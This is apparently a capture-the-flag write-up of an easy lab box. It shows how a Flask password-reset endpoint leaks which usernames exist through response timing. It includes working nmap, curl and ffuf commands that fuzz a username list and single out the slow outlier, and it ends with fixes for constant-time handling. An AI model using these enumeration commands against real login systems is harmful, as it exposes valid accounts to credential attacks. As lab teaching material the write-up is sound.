Hack Smarter · Easy · Web / username enumeration

A deliberately small box with one lesson: not every side channel is in the response body. You're handed a list of 300-odd candidate usernames and a login portal, and asked which one is real. The login and reset pages are built to return byte-identical responses for valid and invalid users — same status, same length — so the usual size-based enumeration finds nothing. The fact that leaks is time: the password-reset handler does real work (token generation, an email send) only for a user that actually exists, and that work is measurable.

$ recon

nmap first (rustscan isn't on the box). Port 80 is a Python Werkzeug / Flask app — and a hand-rolled reset flow is exactly the kind of code that leaks timing: 

nmap -sC -sV -Pn -p- $TARGET
# 22/tcp  ssh     OpenSSH 8.9p1
# 80/tcp  http    Werkzeug httpd 3.1.4 (Python 3.10.12)
#         http-title: HackSmarter Portal - Login

curl -s -o /dev/null -w "login: %{http_code}\n" "http://$TARGET/login"   # 405 (wants POST)
curl -s -o /dev/null -w "reset: %{http_code}\n" "http://$TARGET/reset"   # 200 (takes POST)

$ the dead ends

The obvious approaches all fail, and the box wants you to feel them fail. Fuzz the reset endpoint and filter by response size — every response is the same 1984 bytes, valid user or not. Size-based enumeration is dead by design: 

ffuf -w usernames.txt -u "http://$TARGET/reset" -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=FUZZ' -fw 468
# ...nothing filters out. Every response: Size 1984, Words 468.

$ the bug — a timing oracle

When the body won't distinguish users, look at how long each request takes. A real account triggers the full reset path — generate a token, send a mail — while a non-existent one short-circuits and returns immediately. Baseline a known-bad username, then fuzz the whole list capturing duration: 

# baseline an invalid user
curl -s -o /dev/null -w "invalid: %{time_total}s\n" -X POST \
  "http://$TARGET/reset" -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=zzzznotreal'
# invalid: 0.58s    <- "normal"

# fuzz all 301, record timing to json
ffuf -w usernames.txt -u "http://$TARGET/reset" -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=FUZZ' -p 0.1 -o timing.json -of json

$ exploitation

Everything clusters between roughly 260–680 ms — ordinary jitter. One name sits alone at over a second, completely outside the noise band. That's the account doing extra work: 

joey    [Status: 200, Size: 1984, Duration: 1109ms]    <- outlier
# every other candidate: 260-680ms

Confirm it wasn't a one-off blip by hammering just that name against a known-bad one a few times — joey holds at ~1s while the fake stays sub-500 ms. Deterministic, so it's real: 

for i in 1 2 3; do
  curl -s -o /dev/null -w "joey: %{time_total}s\n" -X POST "http://$TARGET/reset" \
    -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=joey'
done
# joey: 1.02s / 1.05s / 0.99s     (fake stays ~0.4s)

$ flag

valid username : joey

$ takeaway

  • A response can be identical and still leak. The devs correctly neutralised the body — same status, same length for valid and invalid — and then leaked the exact same fact through latency. Constant-body is not constant-time.
  • Any code path whose work depends on whether a record exists is a timing oracle. Password reset, login, "resend verification," coupon lookup — if the valid case sends an email or hits a slower table and the invalid case returns early, the difference is measurable over enough samples.
  • The fix is to make both paths cost the same. Do the expensive work asynchronously (queue the email, don't block the response), or return a fixed generic message after a constant-time code path regardless of whether the account exists.
